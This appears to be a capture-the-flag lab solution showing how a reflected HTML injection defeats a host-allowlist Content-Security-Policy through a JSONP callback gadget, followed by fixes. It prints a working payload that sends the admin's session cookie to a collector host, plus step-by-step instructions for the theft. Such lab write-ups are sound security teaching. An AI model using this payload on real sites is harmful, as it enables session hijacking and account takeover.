# Solution — CSP Bypass via JSONP Endpoint in Allowlist

## Vulnerability class

**CWE-79 · CWE-829 · OWASP A03:2021 – Injection** — a reflected HTML injection
that a Content-Security-Policy is supposed to contain, defeated because the CSP's
`script-src` allowlist includes a host that exposes a **JSONP** endpoint (a
script gadget). The CSP is doing its job against inline script; the flaw is the
_allowlist decision_.

## The sink and the (real) defence

`GET /?q=` is reflected into the page with autoescape off:

```python
_unsafe_env = Environment(autoescape=False)
# ...<div class="results">Results for {{ q }}</div>
```

So `q` becomes live markup. That injection is **contained by CSP**, not by
encoding:

```
script-src 'self' http://accounts-trusted:8080      (no 'unsafe-inline')
```

Verify the CSP genuinely holds against the obvious payloads:

| Reflected payload                                                     | Result                                             |
| --------------------------------------------------------------------- | -------------------------------------------------- |
| `<script>new Image().src='http://collector:9000/report?x=1'</script>` | **blocked** — inline script (no `'unsafe-inline'`) |
| `<img src=x onerror="…">`                                             | **blocked** — inline event handler (same rule)     |
| `<script src="http://accounts-trusted:8080/…">`                       | **allowed** — source is on the allowlist           |

The lab's negative control queues the first two; the collector receives **zero**
beacons. The CSP is not a fig leaf — it stops every inline vector. The only way to
run script is to load it from an **allowlisted host**.

## The gadget: JSONP on the allowlisted host

`http://accounts-trusted:8080` is allowlisted so Vaultboard can embed its accounts
widget. That host exposes:

```
GET /api/jsonp?callback=<name>
      →   /* accounts widget */
          <name>({"authenticated": false, "user": null});
      Content-Type: application/javascript
```

The `callback` name is reflected **verbatim** into an executable position (a real
JSONP endpoint must allow only `[A-Za-z0-9_.]` callbacks — this one does not). So
whatever you put in `callback` becomes the start of a JavaScript statement. That
makes the endpoint a **script gadget**: a legitimately-allowlisted URL that emits
attacker-chosen code.

## The bypass

Reflect a `<script>` whose **source** is the allowlisted gadget, with your payload
as the callback:

```
/?q=<script src="http://accounts-trusted:8080/api/jsonp?callback=
        new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)//
    "></script>
```

- **CSP check:** the script's source is `http://accounts-trusted:8080`, which is on
  the `script-src` allowlist → the browser loads and executes it. (An inline
  script or `onerror` would have been blocked; a _sourced_ script from an allowed
  host is not.)
- **The gadget response** is, verbatim (no reformatting — the bytes matter):
  ```text
  /* accounts widget */
  new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)//({"authenticated": false, "user": null});
  ```
  Your `callback` is the statement; the trailing `//` comments out the `({…});` the
  endpoint appends. The statement runs in **Vaultboard's origin**, so
  `document.cookie` is the admin's `session` cookie (non-HttpOnly), and the beacon
  carries it to the collector.

### Encoding note (why the exploit double-encodes)

The payload travels through two URL layers, and the JSONP host parses its query
string with `parse_qs`. A **literal `+`** in a query string decodes to a _space_,
so the `+` string-concatenation operator must survive as `%2B` all the way to the
gadget — otherwise the echoed JS is `'…' encodeURIComponent(…)` (a syntax error).
`tests/exploit.py` percent-encodes the callback fully (`safe=""`) so `+`→`%2B`; the
outer `q=` layer encodes again, Flask decodes once, and the browser hands the
gadget a clean `%2B`.

## End-to-end

```
# 1. Queue the reflected-JSONP path (URL-encoded) for the admin bot:
POST /report   {"url":"/?q=<url-encoded <script src=…jsonp?callback=…//>>"}

# 2. Wait ~2s. The bot loads the path with its session; the allowlisted <script src>
#    loads, the JSONP echoes your JS, it runs in the app origin and beacons the cookie.

# 3. Read the collector (app-side proxy):
GET /oob/received            # find /report?c=session%3D<32 hex>

# 4. Submit the session:
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this and asserts `script-src` does **not** contain
`'unsafe-inline'` (proving the CSP is the real barrier that only the gadget
defeats).

## Why the containment holds

- Collector + bot + the mock trusted host live on a `backend` network with
  `internal: true` — **no route off the host**. The stolen cookie reaches the
  in-lab collector but never the internet, so the lab ships a real cookie-theft
  primitive at `risk: low`.
- `/internal/bot-login` and `/internal/queue` are firewalled to the backend subnet
  **and** the login is gated by a `BOT_KEY`, so a public visitor cannot mint the
  admin cookie or read the queue and skip the XSS.
- Single gunicorn worker: the report queue and admin session live in-process, so
  the bot and the exploit see one consistent state.

## The fix

1. **Audit the `script-src` allowlist — the real fix.** A host allowlist is only
   as strong as the _weakest gadget_ on any host it names. Hosts that expose JSONP
   endpoints, old AngularJS, or user-uploaded content turn `script-src <host>` into
   an effective `'unsafe-inline'`. Either drop such hosts, or serve the widget a
   way that carries no gadget. Google's own research ("CSP Is Dead, Long Live CSP")
   found the majority of real-world host-allowlist CSPs were bypassable this way.
2. **Prefer nonces or hashes over host allowlists.** `script-src 'nonce-<random>'`
   (or `'strict-dynamic'` with a nonce) only executes scripts your server tagged
   this request — an injected `<script src>` to a third-party gadget has no valid
   nonce and is blocked, regardless of which hosts exist.
3. **CSP is defence-in-depth, not the primary control.** Encode the reflected
   output (`{{ q }}` with autoescape **on**) so there is no HTML injection to
   contain in the first place. Fix the JSONP endpoint too: validate `callback`
   against `^[A-Za-z0-9_.]+$`.

## Deviation from the catalog stack

The catalogued scenario pairs a **Flask** target with a **Node/Express** mock
trusted host behind nginx. This lab keeps the Flask target and implements the mock
allowlisted host as a tiny **stdlib JSONP service** (an overridden entrypoint on
the same image, like the collector). The JSONP gadget — "reflect the `callback`
name into an executable position" — is framework-independent, so Express/nginx are
incidental; the taught vulnerability (a CSP `script-src` host-allowlist defeated by
a JSONP gadget on an allowlisted origin) is identical. The Playwright verifier
stands in for Puppeteer.
